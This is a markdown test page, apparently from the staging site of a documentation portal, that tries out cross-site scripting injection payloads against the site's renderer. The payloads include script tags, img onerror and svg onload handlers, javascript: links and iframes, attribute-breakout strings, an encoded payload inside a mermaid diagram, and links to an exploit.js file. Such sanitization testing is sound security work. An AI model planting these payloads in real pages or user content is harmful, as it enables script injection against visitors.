# injection

pentest

object

<object data="https://stg.docs.developer.tech.gov.sg/docs/injection/pentest.svg" type="image/svg+xml"></object>

<script src="https://stg.docs.developer.tech.gov.sg/docs/injection/pentest.svg">


<script>alert('XSS');</script>

![Broken Image](invalid.jpg ':size=250' )
<img src="invalid.jpg" onerror="alert('XSS')">

<svg onload="alert('XSS')"></svg>

<img src="valid-image.jpg" alt="test" title="XSS" onerror=alert('XSS')>

<img src="valid-image.jpg" alt="test" title="><script>alert('XSS')</script>">

<iframe src="javascript:alert('XSS');"></iframe>

[Click Me](javascript:alert('XSS'))

[malicious link](something"onmouseover="alert('XSS'))

## XSS Test
 ```mermaid
  graph LR
      B-->D(<img onerror=location=`javascript\u003aalert\u0028document.domain\u0029` src=x>);
 ```
## js script
-[get jpg](/SampleJPGImage_1mbmb.jpg ':target=_blank')
-[get js](/exploit.js)
![get js](/exploit.js)
-[get js](/pentest.svg)
![get js](/pentest.svg)
-[get js](/pentest.svg.png)
![get js](/pentest.svg.png)

-[pentest](/pentest.js ':include :type=code')

-[pentest tok](/pentest)
-[pentest md](/pentest.js.md)



```
## iFrames Test

<figure>
<iframe width="425" height="350" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://i.ytimg.com/vi/-IXqbuMOwYg/hq720.jpg?sqp=-oaymwEcCNAFEJQDSFXyq4qpAw4IARUAAIhCGAFwAcABBg==&rs=AOn4CLDmcWpHub9FsBmp6vQgQTz0sWK14Q" style="border: 1px solid black"></iframe>
</figure>

<figure>
<iframe width="560" height="315" src="https://www.youtube.com/embed/-IXqbuMOwYg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</figure>
```
